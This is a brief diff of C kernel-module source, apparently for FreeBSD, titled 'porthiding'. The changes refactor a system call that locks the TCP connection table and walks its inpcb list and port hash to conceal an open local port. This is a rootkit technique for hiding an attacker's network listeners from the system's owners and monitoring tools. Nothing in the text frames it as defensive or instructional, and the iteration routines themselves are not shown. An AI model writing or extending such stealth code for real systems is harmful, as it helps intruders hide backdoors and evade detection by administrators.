@@ -1,3 +1,5 @@
+#include "porthiding.h"
+
 #include <sys/types.h>
 #include <sys/param.h>
 #include <sys/proc.h>
@@ -55,9 +57,7 @@ struct port_hiding_args {
     u_int16_t lport; /* local port */
 };
 
-static int hide_port(u_int16_t lport){
-  
-}
+
 //1
 static int iterate_ipi_listhead(u_int16_t lport) {
     struct inpcb *inpb;
@@ -105,12 +105,12 @@ static int iterate_hash(u_int16_t lport){
 */
 
 /* System call to hide an open port. */
-static int port_hiding(u_int16_t lport) {
+int port_hiding(u_int16_t lport) {
 
     INP_INFO_WLOCK(&V_tcbinfo);
     /* Iterate through the TCP-based inpcb list. */
-    iterate_ipi_listhead(uap->lport); 
-    iterate_port_hash(uap->lport); 
+    iterate_ipi_listhead(lport); 
+    iterate_port_hash(lport); 
     INP_INFO_WUNLOCK(&V_tcbinfo);
     return(0);
 }
